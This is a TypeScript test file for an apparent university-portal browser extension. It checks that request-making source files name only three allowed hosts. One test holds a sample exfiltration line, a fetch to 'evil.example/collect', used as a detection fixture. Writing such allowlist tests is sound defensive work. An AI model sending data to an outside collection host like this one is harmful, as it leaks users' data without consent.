// PLT-10.1: the extension requests only FAP, FLM and the data channel host (platform R7.1). Every source
// file that makes a request (fetch, XMLHttpRequest, chrome.tabs.create, chrome.windows.create) may name no
// other host. URL strings that are never requested (links, namespaces) are out of scope.
import { describe, expect, it } from 'vitest'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join } from 'node:path'

export const ALLOWED = new Set(['fap.fpt.edu.vn', 'flm.fpt.edu.vn', 'raw.githubusercontent.com'])
const REQUEST = /\bfetch\(|new XMLHttpRequest|\btabs\.create\(|\bwindows\.create\(/

/** Hosts of the absolute URL literals in a source text that makes requests; empty otherwise. */
export function requestHosts(text: string): string[] {
  if (!REQUEST.test(text)) return []
  return [...text.matchAll(/https?:\/\/([a-z0-9.-]+)/gi)].map((m) => m[1]!.toLowerCase())
}

function files(dir: string): string[] {
  return readdirSync(dir).flatMap((n) => {
    const p = join(dir, n)
    return statSync(p).isDirectory() ? files(p) : /\.(ts|tsx)$/.test(n) ? [p] : []
  })
}

describe('network destinations', () => {
  it('name only FAP, FLM and the data channel host where requests are made', () => {
    const found = new Map<string, string[]>()
    for (const f of files('src')) {
      // Comments are not requests.
      const code = readFileSync(f, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:])\/\/.*$/gm, '$1')
      if (!REQUEST.test(code)) continue
      found.set(f, requestHosts(code))
    }
    expect([...found.keys()].map((f) => f.replace(/\\/g, '/'))).toEqual(expect.arrayContaining(['src/content/fap/access.ts', 'src/background/tabs.ts']))
    const bad = [...found].flatMap(([f, hosts]) => hosts.filter((h) => !ALLOWED.has(h)).map((h) => `${f}: ${h}`))
    expect(bad).toEqual([])
    expect([...found.values()].flat()).toContain('fap.fpt.edu.vn')
  })

  it('catches a request to another host', () => {
    expect(requestHosts("await fetch('https://evil.example/collect?x=1')")).toEqual(['evil.example'])
    expect(requestHosts("const a = 'https://evil.example/' // never requested")).toEqual([])
  })
})
